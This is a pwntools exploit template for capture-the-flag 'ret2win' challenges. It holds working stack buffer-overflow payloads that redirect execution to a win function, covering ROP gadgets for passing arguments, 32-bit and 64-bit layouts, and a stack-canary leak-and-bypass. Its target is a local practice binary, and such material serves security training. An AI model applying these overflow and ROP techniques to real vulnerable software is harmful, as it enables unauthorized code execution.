#!/usr/bin/env python3
"""
ret2win - basic bof to win func

simplest bof - just overwrite ret addr to jump to the win function

covers:
    - No PIE, no canary → direct overflow to win()
    - With args: win(arg1, arg2) via ROP gadgets
    - 32-bit and 64-bit
    - With canary: canary leak + overflow
"""
from pwn import *
import sys

BINARY = './chall'
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF(BINARY) if os.path.exists(BINARY) else None

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)


OFFSET = 72                  # padding before return address
WIN    = None                # elf.sym['win'] or manual address


def find_offset_interactive():
    """
    Generate cyclic pattern, crash binary, find offset from core/GDB.

    In GDB: cyclic -l <value_at_RSP_or_EIP>
    """
    p = conn()
    pattern = cyclic(500, n=8 if context.arch == 'amd64' else 4)
    p.sendline(pattern)
    p.wait()
    # Check core dump: `dmesg | tail` or GDB `info reg`
    # Then: cyclic_find(0x61616161, n=4) for 32-bit
    #        cyclic_find(0x6161616161616166, n=8) for 64-bit


def exploit():
    p = conn()

    win_addr = WIN or elf.sym.get('win') or elf.sym.get('flag') or elf.sym.get('shell')
    log.info(f'win = {hex(win_addr)}')

    
    payload = b'A' * OFFSET

    if context.arch == 'amd64':
        # Stack alignment: may need a `ret` gadget before win
        rop = ROP(elf)
        try:
            ret = rop.find_gadget(['ret'])[0]
            payload += p64(ret)   # align stack to 16 bytes
        except:
            pass
        payload += p64(win_addr)
    else:
        payload += p32(win_addr)

    log.info(f'Payload ({len(payload)}B)')
    # p.sendlineafter(b'prompt', payload)
    p.sendline(payload)
    p.interactive()


def exploit_with_args():
    """When win(arg1, arg2) requires specific arguments."""
    p = conn()

    win_addr = WIN or elf.sym['win']
    rop = ROP(elf)

    payload = b'A' * OFFSET

    if context.arch == 'amd64':
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret     = rop.find_gadget(['ret'])[0]

        # win(0xdeadbeef) — one arg
        payload += p64(ret)          # stack alignment
        payload += p64(pop_rdi)
        payload += p64(0xdeadbeef)   # arg1
        payload += p64(win_addr)

        # For two args: also need pop rsi; pop r15; ret
        # pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
        # payload += p64(pop_rsi_r15)
        # payload += p64(0xcafebabe)   # arg2
        # payload += p64(0)            # r15 (junk)
        # payload += p64(win_addr)
    else:
        # 32-bit: func(arg1, arg2) = [func][ret][arg1][arg2]
        payload += p32(win_addr)
        payload += p32(0xdeadbeef)   # return addr (don't care)
        payload += p32(0xdeadbeef)   # arg1
        # payload += p32(0xcafebabe)   # arg2

    log.info(f'Payload with args ({len(payload)}B)')
    p.sendline(payload)
    p.interactive()


def exploit_with_canary():
    """When stack canary is present — leak it first, then overflow."""
    p = conn()

    # Step 1: Leak canary (via format string, over-read, etc.)
    # Example: format string leak
    # p.sendline(b'%7$p')  # adjust offset
    # canary = int(p.recvline().strip(), 16)

    # Example: over-read (off-by-one null byte)
    # p.send(b'A' * (CANARY_OFFSET + 1))  # overwrite canary's null byte
    # p.recv(CANARY_OFFSET)
    # canary_leak = p.recv(7)
    # canary = u64(b'\x00' + canary_leak)

    canary = 0x0  # REPLACE with leaked canary

    win_addr = WIN or elf.sym['win']

    CANARY_OFFSET = 64  # bytes from buffer start to canary
    SBP_SIZE = 8 if context.arch == 'amd64' else 4  # saved base pointer

    payload  = b'A' * CANARY_OFFSET
    payload += p64(canary) if context.arch == 'amd64' else p32(canary)
    payload += b'B' * SBP_SIZE   # saved rbp/ebp (junk)

    if context.arch == 'amd64':
        rop = ROP(elf)
        try:
            ret = rop.find_gadget(['ret'])[0]
            payload += p64(ret)
        except:
            pass
        payload += p64(win_addr)
    else:
        payload += p32(win_addr)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
